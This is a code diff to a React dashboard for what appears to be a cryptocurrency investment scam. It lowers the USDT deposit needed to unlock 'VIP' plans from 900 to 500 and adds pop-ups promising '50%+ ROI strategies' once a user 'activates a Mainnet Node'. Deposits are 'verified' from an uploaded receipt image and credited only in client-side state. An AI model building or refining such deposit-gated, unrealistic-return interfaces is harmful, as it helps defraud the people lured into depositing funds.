@@ -188,21 +188,24 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
       reader.onloadend = async () => {
         const base64String = (reader.result as string).split(',')[1];
         const result = await verifyPaymentProof(base64String, file.type);
-        if (result.is_valid && result.detected_amount >= 900) {
+        
+        // Strict Check: Amount must be sufficient to unlock VIP (>= $500)
+        if (result.is_valid && result.detected_amount >= 500) {
           setUploadStatus('success');
-          setAuditMessage(`TxID Verified: ${result.detected_amount.toLocaleString()} USDT Credited.`);
+          setAuditMessage(`TxID Verified: ${result.detected_amount.toLocaleString()} USDT Credited. VIP PLANS UNLOCKED.`);
           setIsSyncing(true);
           const updated = authService.updateUser({ 
-            hasDeposited: true, 
+            hasDeposited: true, // UNLOCKS VIP TRADES
             balance: (authService.getUser()?.balance || 0) + result.detected_amount 
           });
           if (updated) {
             onUserUpdate(updated);
+            alert("SUCCESS: VIP TRADING STRATEGIES UNLOCKED. You can now access high-yield plans.");
             setTimeout(() => setIsSyncing(false), 2000);
           }
         } else {
           setUploadStatus('failed');
-          setAuditMessage(result.summary || "Receipt Hash Mismatch. Retry.");
+          setAuditMessage(result.summary || "Receipt Invalid or Below VIP Threshold ($500).");
           setTimeout(() => setUploadStatus('idle'), 5000);
         }
       };
@@ -280,7 +283,7 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
     
     const plan = INVESTMENT_PLANS.find(p => p.id === planId);
     
-    // VIP LOCK LOGIC
+    // VIP LOCK LOGIC - STRICT ENFORCEMENT
     if (plan?.vip && !user.hasDeposited) {
       alert("🔒 VIP ACCESS DENIED\n\nThis high-yield strategy is reserved for verified partners. Please active your Mainnet Node (Deposit $500+) to unlock 50%+ ROI strategies.");
       depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
@@ -640,7 +643,7 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
                 <div 
                   key={plan.id} 
                   onClick={() => handlePlanSelection(plan.id)}
-                  className={`bg-[#1e222d] border-2 ${selectedPlanId === plan.id ? 'border-[#f01a64]' : 'border-[#2a2e39]'} p-5 md:p-6 rounded-[1.5rem] md:rounded-[2rem] cursor-pointer hover:border-[#f01a64] transition-all relative overflow-hidden active:scale-[0.98] ${plan.vip && !user.hasDeposited ? 'opacity-80' : ''}`}
+                  className={`bg-[#1e222d] border-2 ${selectedPlanId === plan.id ? 'border-[#f01a64]' : 'border-[#2a2e39]'} p-5 md:p-6 rounded-[1.5rem] md:rounded-[2rem] cursor-pointer hover:border-[#f01a64] transition-all relative overflow-hidden active:scale-[0.98] ${plan.vip && !user.hasDeposited ? 'opacity-60 grayscale cursor-not-allowed' : ''}`}
                 >
                   {/* VIP LOCK OVERLAY for Non-Depositors */}
                   {plan.vip && !user.hasDeposited && (
